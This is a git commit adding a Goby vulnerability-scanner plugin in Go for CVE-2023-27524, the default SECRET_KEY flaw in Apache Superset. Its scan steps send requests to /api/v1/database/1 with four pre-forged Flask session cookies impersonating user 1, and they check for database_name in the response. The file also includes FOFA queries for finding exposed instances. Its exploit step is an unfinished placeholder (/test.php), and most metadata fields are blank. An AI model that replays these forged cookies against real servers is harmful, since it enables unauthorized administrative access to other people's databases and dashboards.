10b27e412f3e6bcd63e5c2bc83f6c9a3495efa70
清晨 <37011241+qingchenhh@users.noreply.github.com>
2023-04-27 22:52:36 +0800

    Add files via upload

---
+++ Goby/Apache_Superset_default_SECRET_KEY_CVE_2023_27524.go
@@ -0,0 +1,244 @@
+package exploits
+
+import (
+	"git.gobies.org/goby/goscanner/goutils"
+)
+
+func init() {
+	expJson := `{
+  "Name": "Apache Superset 默认SECRET_KEY 漏洞（CVE-2023-27524）",
+  "Description": "",
+  "Product": "",
+  "Homepage": "",
+  "DisclosureDate": null,
+  "Author": "清晨",
+  "FofaQuery": "app=\"APACHE-Superset\" || product=\"APACHE-Superset\" || body=\"Superset\"",
+  "GobyQuery": "app=\"APACHE-Superset\" || product=\"APACHE-Superset\" || body=\"Superset\"",
+  "Level": "2",
+  "Impact": "",
+  "Recommendation": "",
+  "References": [],
+  "Is0day": false,
+  "HasExp": false,
+  "ExpParams": [],
+  "ExpTips": {
+    "Type": "",
+    "Content": ""
+  },
+  "ScanSteps": [
+    "OR",
+    {
+      "Request": {
+        "method": "GET",
+        "uri": "/api/v1/database/1",
+        "follow_redirect": true,
+        "header": {
+          "Cookie": "session=eyJfdXNlcl9pZCI6MSwidXNlcl9pZCI6MX0.ZEo--Q.imbCp_QaDbdE266Q8Bqd8BZreGY"
+        },
+        "data_type": "text",
+        "data": ""
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "==",
+            "value": "200",
+            "bz": ""
+          },
+          {
+            "type": "item",
+            "variable": "$body",
+            "operation": "contains",
+            "value": "\"database_name\"",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": []
+    },
+    {
+      "Request": {
+        "method": "GET",
+        "uri": "/api/v1/database/1",
+        "follow_redirect": true,
+        "header": {
+          "Cookie": "session=eyJfdXNlcl9pZCI6MSwidXNlcl9pZCI6MX0.ZEo_ag.c1zZy9SlwKHrU4RCA2eWZlYtKWM"
+        },
+        "data_type": "text",
+        "data": ""
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "==",
+            "value": "200",
+            "bz": ""
+          },
+          {
+            "type": "item",
+            "variable": "$body",
+            "operation": "contains",
+            "value": "\"database_name\"",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": []
+    },
+    {
+      "Request": {
+        "method": "GET",
+        "uri": "/api/v1/database/1",
+        "follow_redirect": true,
+        "header": {
+          "Cookie": "session=eyJfdXNlcl9pZCI6MSwidXNlcl9pZCI6MX0.ZEpEfA.I3s4WBNKYVrQ8vPN9K_o0qvcuRc"
+        },
+        "data_type": "text",
+        "data": ""
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "==",
+            "value": "200",
+            "bz": ""
+          },
+          {
+            "type": "item",
+            "variable": "$body",
+            "operation": "contains",
+            "value": "\"database_name\"",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": []
+    },
+    {
+      "Request": {
+        "method": "GET",
+        "uri": "/api/v1/database/1",
+        "follow_redirect": true,
+        "header": {
+          "Cookie": "session=eyJfdXNlcl9pZCI6MSwidXNlcl9pZCI6MX0.ZEo-5A.TCWJ9S4blxdFOvVHdbZZXoC-oLw"
+        },
+        "data_type": "text",
+        "data": ""
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "==",
+            "value": "200",
+            "bz": ""
+          },
+          {
+            "type": "item",
+            "variable": "$body",
+            "operation": "contains",
+            "value": "\"database_name\"",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": []
+    }
+  ],
+  "ExploitSteps": [
+    "AND",
+    {
+      "Request": {
+        "method": "GET",
+        "uri": "/test.php",
+        "follow_redirect": true,
+        "header": {},
+        "data_type": "text",
+        "data": ""
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "==",
+            "value": "200",
+            "bz": ""
+          },
+          {
+            "type": "item",
+            "variable": "$body",
+            "operation": "contains",
+            "value": "test",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": []
+    }
+  ],
+  "Tags": [],
+  "VulType": [],
+  "CVEIDs": [
+    ""
+  ],
+  "CNNVD": [
+    ""
+  ],
+  "CNVD": [
+    ""
+  ],
+  "CVSSScore": "",
+  "Translation": {
+    "CN": {
+      "Name": "Apache Superset 默认SECRET_KEY 漏洞（CVE-2023-27524）",
+      "Product": "",
+      "Description": "",
+      "Recommendation": "",
+      "Impact": "",
+      "VulType": [],
+      "Tags": []
+    },
+    "EN": {
+      "Name": "Apache Superset default SECRET_KEY CVE-2023-27524",
+      "Product": "",
+      "Description": "",
+      "Recommendation": "",
+      "Impact": "",
+      "VulType": [],
+      "Tags": []
+    }
+  },
+  "AttackSurfaces": {
+    "Application": null,
+    "Support": null,
+    "Service": null,
+    "System": null,
+    "Hardware": null
+  }
+}`
+
+	ExpManager.AddExploit(NewExploit(
+		goutils.GetFileName(),
+		expJson,
+		nil,
+		nil,
+	))
+}
